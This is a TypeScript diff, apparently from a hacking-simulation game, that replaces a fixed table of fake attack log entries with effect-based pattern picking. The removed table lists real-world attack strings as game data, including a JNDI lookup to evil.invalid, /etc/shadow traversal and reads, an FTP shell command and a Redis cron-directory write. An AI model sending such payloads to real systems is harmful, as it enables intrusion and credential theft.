@@ -1,9 +1,11 @@
 import { createPrng, type Prng } from '../prng';
-import type { AttackPattern, Severity, Vulnerability } from '../../network/types';
+import type { Severity, Vulnerability } from '../../network/types';
 import type { GeneratedVersion } from './walker';
 import { pickEffect } from './effectPicker';
 import { serviceTemplates } from '../pools/serviceTemplates';
 import { firmwareTemplates } from '../pools/routerFirmware';
+import { describeEffect } from '../describeEffect';
+import { pickPatternForEffect } from '../attackPatterns';
 
 // Stable numeric ID per service/firmware-vendor name. Used to pack the CVE
 // serial so (service, index) pairs always produce unique ids across the
@@ -17,101 +19,12 @@ const TEMPLATE_KEY_IDS: Readonly<Record<string, number>> = (() => {
 
 // Deterministic CVE construction for procedurally generated timeline entries.
 // Each generated CVE has:
-// - A CVE id derived from (service, index)
-// - A generic service-specific attack pattern (or syslog fallback)
+// - A CVE id derived from (service, index) — uniqueness-guaranteed
+// - An effect rolled from the service's effect pool
+// - An effect-aware attack pattern (log entry that matches what the exploit did)
+// - A description that matches the effect kind
 // - A weighted-random severity
 // - publishedAt copied from the walker entry
-
-// Attack pattern templates per service. Used when a procedural CVE needs
-// an attack pattern (generic, not CVE-specific). Each service picks from
-// its own list; services without a template fall through to the syslog
-// fallback below.
-const GENERATED_ATTACK_PATTERNS: Readonly<Record<string, readonly AttackPattern[]>> = {
-  http: [
-    {
-      logFile: '/var/log/access.log',
-      method: 'GET',
-      path: '/cgi-bin/?cmd=id',
-      status: 500,
-    },
-    {
-      logFile: '/var/log/access.log',
-      method: 'GET',
-      path: '/?file=../../../../etc/shadow',
-      status: 404,
-    },
-    {
-      logFile: '/var/log/access.log',
-      method: 'POST',
-      path: '/admin/login',
-      status: 500,
-    },
-    {
-      logFile: '/var/log/access.log',
-      method: 'GET',
-      path: '/?x=${jndi:ldap://evil.invalid/a}',
-      status: 200,
-    },
-  ],
-  'http-alt': [
-    {
-      logFile: '/var/log/access.log',
-      method: 'POST',
-      path: '/manager/html',
-      status: 500,
-    },
-  ],
-  https: [
-    {
-      logFile: '/var/log/access.log',
-      method: 'GET',
-      path: '/api/v1/users?admin=true',
-      status: 500,
-    },
-  ],
-  ftp: [
-    { logFile: '/var/log/vsftpd.log', command: 'SITE EXEC /bin/sh' },
-    { logFile: '/var/log/vsftpd.log', command: "USER admin'\\0" },
-  ],
-  mysql: [
-    { logFile: '/var/log/mysql.log', query: "SELECT LOAD_FILE('/etc/shadow')" },
-    {
-      logFile: '/var/log/mysql.log',
-      query: "SET GLOBAL general_log_file = '/var/lib/mysql/pwn.so'",
-    },
-  ],
-  redis: [
-    { logFile: '/var/log/redis.log', message: 'CONFIG SET dir /var/spool/cron' },
-    { logFile: '/var/log/redis.log', message: 'EVAL os.execute bypass attempt' },
-  ],
-  smtp: [
-    {
-      logFile: '/var/log/mail.log',
-      daemon: 'postfix/smtpd',
-      message: 'warning: malformed MAIL FROM buffer overflow',
-    },
-  ],
-  imap: [
-    {
-      logFile: '/var/log/mail.log',
-      daemon: 'dovecot',
-      message: 'imap-login: stack overflow in LIST command',
-    },
-  ],
-  pop3: [
-    {
-      logFile: '/var/log/mail.log',
-      daemon: 'dovecot',
-      message: 'pop3-login: crash in RETR parser',
-    },
-  ],
-};
-
-const GENERIC_SYSLOG_ATTACK = (service: string, version: string): AttackPattern => ({
-  logFile: '/var/log/syslog',
-  daemon: service,
-  message: `anomalous request targeting ${version}`,
-});
 
 const pickGeneratedSeverity = (prng: Prng): Severity => {
   // Weighted toward high (the "typical" CVE). Critical is rare but present.
@@ -142,19 +55,12 @@ export const buildGeneratedVuln = (service: string, entry: GeneratedVersion): Vu
   const cve = `CVE-${year}-${String(serial).padStart(7, '0')}`;
 
   const severity = pickGeneratedSeverity(prng);
-
-  const patternPool = GENERATED_ATTACK_PATTERNS[service];
-  const attackPattern = patternPool
-    ? prng.pick(patternPool)
-    : GENERIC_SYSLOG_ATTACK(service, entry.version);
-
-  // Effect is rolled AFTER all existing picks so the PRNG sequence for
-  // CVE id, severity, and attack pattern is preserved from Phase 3.
   const effect = pickEffect(service, prng);
+  const attackPattern = pickPatternForEffect(service, effect, prng);
 
   return {
     cve,
-    description: `${service} ${entry.version} remote code execution (${cve})`,
+    description: describeEffect(service, entry.version, cve, effect),
     serviceVersion: entry.version,
     attackPattern,
     severity,
